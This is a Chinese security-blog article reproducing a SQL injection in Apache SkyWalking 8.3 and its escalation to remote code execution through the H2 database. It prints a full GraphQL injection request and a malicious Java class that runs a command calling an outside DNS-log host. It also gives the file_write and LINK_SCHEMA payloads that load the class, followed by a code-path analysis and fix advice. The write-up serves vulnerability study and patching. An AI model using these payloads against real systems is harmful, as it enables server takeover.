> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/69JLJs1PW74U0sW5M6RjHw)

  

**上方蓝色字体关注我们，一起学安全！**

**作者：****microworld****@Timeline Sec  
**

**本文字数：1429**

**阅读时长：4～5min**

**声明：请勿用作违法用途，否则后果自负**

  

**0x01 简介**  

  
  

Apache SkyWalking 是一款应用性能监控（APM）工具，对微服务、云原生和容器化应用提供自动化、高性能的监控方案。项目于 2015 年创建，并于 2017 年 12 月进入 Apache 孵化器。

  

Apache SkyWalking 提供了分布式追踪，服务网格（Service Mesh）遥感数据分析，指标聚合和可视化等多种能力。项目覆盖范围，从一个单纯的分布式追踪系统，扩展为一个可观测性分析平台（observability analysis platform）和应用性能监控管理系统。

  

**0x02 漏洞概述**  

  
  

基于CVE-2020-9483、CVE-2020-13921，由于修补并不完善，导致被发现还存在一处SQL注入漏洞。结合 h2 数据库（默认的数据库），可以导致 RCE 。

  

**0x03 影响版本**  

  
  

Apache Skywalking <= 8.3  

  

**0x04 环境搭建**  

  
  

利用vulhub的环境：  

```
`wget https://github.com/vulhub/vulhub/blob/master/skywalking/8.3.0-sqli/docker-compose.yml``docker-compose up -d`
```

  

然后访问8080端口，出现如下证明正常启动服务  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

**0x05 漏洞复现**  

  
  

### **1、报错**  

对于vulhub提供的请求包，需要做些调整，请求如下：

```
`POST /graphql HTTP/1.1``Host: 192.168.18.154:8080``Cache-Control: max-age=0``Upgrade-Insecure-Requests: 1``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9``Accept-Encoding: gzip, deflate``Accept-Language: zh-CN,zh;q=0.9``Connection: close``Content-Type: application/json``Content-Length: 554``{` `"query":"query queryLogs($condition: LogQueryCondition) {` `queryLogs(condition: $condition) {` `total` `logs {` `serviceId` `serviceName` `isError` `content` `}` `}``}``",` `"variables":{` `"condition":{` `"metricName":"INFORMATION_SCHEMA.USERS union all select h2version())a where 1=? or 1=? or 1=? --",` `"endpointId":"1",` `"traceId":"1",` `"state":"ALL",` `"stateCode":"1",` `"paging":{` `"pageSize":10` `}` `}` `}``}`
```

  

成功报错：  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

### **2、RCE**

总的来说分为两步：

（1）利用file_write写入一个类

编写恶意类：

```
`import java.io.IOException;``public class evil {` `static {` `try {` `Runtime.getRuntime().exec("ping 7hmkm6.dnslog.cn");` `} catch (IOException e) {` `e.printStackTrace();` `}` `}` `public static void main(String[] args) {` `}``}`
```

  

生成恶意类：

```
javac evil.java -target 1.6 -source 1.6
```

  

转为hex：

```
`with open("evil.class","rb") as f:` `a=f.read()` `print(a.hex())`
```

  

写入类：  

```
INFORMATION_SCHEMA.USERS union  all select file_write('[替换为自己的hex编码结果]','evil.class'))a where 1=? or 1=? or 1=? --
```

  

（2）利用LINK_SCHEMA调用该类

```
INFORMATION_SCHEMA.USERS union  all select LINK_SCHEMA('TEST2','evil','jdbc:h2:./test2','sa','sa','PUBLIC'))a where 1=? or 1=? or 1=? --
```

  

有一点要记住：  

由于双亲委派机制，导致加载一次恶意类之后，再去使用 link_schema 加载的时候无法加载。所以在实际使用的时候，需要再上传一个其他名字的恶意类来加载。

  

**即每次加载类，要替换名称。**

  

成功获取结果：  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

**0x06 漏洞分析**  

  
  

整个sql注入调用栈如下：  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

当请求/graphql路由时，会交由  

org.apache.skywalking.oap.query.graphql的dopost处理  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

dopost获取请求的json数据  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

因为是向querylogs发起查询请求  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

所以就走到  

org.apache.skywalking.oap.query.graphql.resolver的LogQuery.queryLogs的方法，返回时调用getQueryService().queryLogs方法  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

走到org.apache.skywalking.oap.server.core.query的LogQueryService类的queryLogs方法  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

通过调用getLogQueryDAO方法，获取一个ILogQueryDAO对象  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

进行计算该表达式可知，返回一个h2client  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

H2LogQueryDAO继承了ILogQueryDAO接口，所以最终走入H2LogQueryDAO类的queryLogs方法，拼接metricName  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

然后执行查询

```
 `try (ResultSet resultSet = h2Client.executeQuery(connection, buildCountStatement(sql.toString()), parameters` `.toArray(new Object[0]))) {` `while (resultSet.next()) {` `logs.setTotal(resultSet.getInt("total"));` `}` `}`
```

```
  

```

buildCountStatement将sql语句拼入select count：  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

我们执行h2Client.executeQuery()，便可以得到报错结果  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

最后回到org.apache.skywalking.oap.query.graphql的GraphQLQueryHandler类，将查询结果以json形式返回  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "image.png")

  

**0x07 修复方式**  

  
  
  

1、升级Apache Skywalking 到最新的 v8.4.0 版本。

2、将默认h2数据库替换为其它支持的数据库。

  

```
**参考链接：**
```

https://www.anquanke.com/post/id/231753  

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行